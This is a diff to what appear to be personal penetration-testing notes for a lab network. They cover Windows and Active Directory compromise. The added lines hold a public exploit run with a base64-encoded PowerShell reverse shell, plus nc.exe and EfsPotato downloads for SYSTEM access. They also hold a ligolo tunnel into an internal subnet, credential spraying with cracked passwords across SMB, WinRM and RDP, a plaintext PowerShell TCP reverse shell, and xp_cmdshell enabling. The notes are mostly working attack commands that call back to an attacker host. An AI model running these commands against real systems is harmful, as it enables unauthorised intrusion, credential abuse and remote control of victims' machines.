@@ -46,7 +46,7 @@ sudo responder -I tun0
 hashcat -m 5600 web_svc3.hash /usr/share/wordlists/rockyou.txt --force --show
 
 # try using the password to get a shell
-ssh web_svc@192.168.194.147
+ssh web_svc@192.168.190.147
 
 iwr -uri http://192.168.45.219:8000/winPEASx64.exe -Outfile winPEAS.exe
 .\winPEAS.exe
@@ -279,6 +279,66 @@ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpass
 # find exploit: https://www.exploit-db.com/exploits/47799
 searchsploit -m 47799
 python3 47799.py 192.168.190.151 whoami 
-python3 47799.py 192.168.190.151 "busybox nc 192.168.45.234 1234 -e /bin/bash"
+
+# prepare encoded powershell command to catch shell
+python3 47799.py 192.168.190.151 "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMwA0ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+```
+
+.151 privesc
+```
+whoami /priv
+# we have SeImpersonate so we can try potatoes
+
+iwr -uri http://192.168.45.234/efspotato.cs -Outfile efspotato.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs
+
+iwr -uri http://192.168.45.234/nc.exe -Outfile nc.exe
+
+.\efspotato.exe whoami
+.\efspotato.exe "nc.exe 192.168.45.234 5555 -e cmd"
+```
+
+AD lateral movement from .147
+```
+ssh web_svc@192.168.190.147
+
+# from kali
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+# from proxy on kali
+>> session
+>> start
+
+# add route to internal network
+sudo ip route add 10.10.80.0/24 dev ligolo
+
+# from windows target
+iwr -uri http://192.168.45.234/agent.exe -Outfile agent.exe
+./agent.exe -ignore-cert -connect 192.168.45.234:11601
+```
+
+.148
+```
+nmap -Pn 10.10.80.148
+nmap -Pn -p 1000-10000 10.10.80.148
+# sql_svc - Dolphin1
+# mary.williams - Freedom1
+
+# only the first command works, but cannot get a shell  from anything but mssql
+crackmapexec smb 10.10.80.148 -u sql_svc -p 'Dolphin1' --continue-on-success
+crackmapexec winrm 10.10.80.148 -u sql_svc -p 'Dolphin1' --continue-on-success
+crowbar -b rdp -s 10.10.80.148/32 -u sql_svc -c "Dolphin1" -n 1
+impacket-smbexec sql_svc:Dolphin1@10.10.80.148
+evil-winrm -i 10.10.80.148 -u sql_svc -p "Dolphin1"
+crackmapexec smb 10.10.80.148 -u sql_svc -p Dolphin1 -X "$c = New-Object System.Net.Sockets.TCPClient('192.168.45.234',1234);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
+smbclient -L 10.10.80.148
+smbclient -L //10.10.80.148/ -U sql_svc --password=Dolphin1
+crackmapexec smb --exec-method atexec -u sql_svc -p 'Dolphin1' -x "whoami" 10.10.80.148
+crackmapexec smb --exec-method mmcexec -u sql_svc -p 'Dolphin1' -X "whoami" 10.10.80.148
+
+# mssql reverse shell https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/
+impacket-mssqlclient sql_svc:Dolphin1@10.10.80.148 -windows-auth
+enable_xp_commandshell
 
 ```
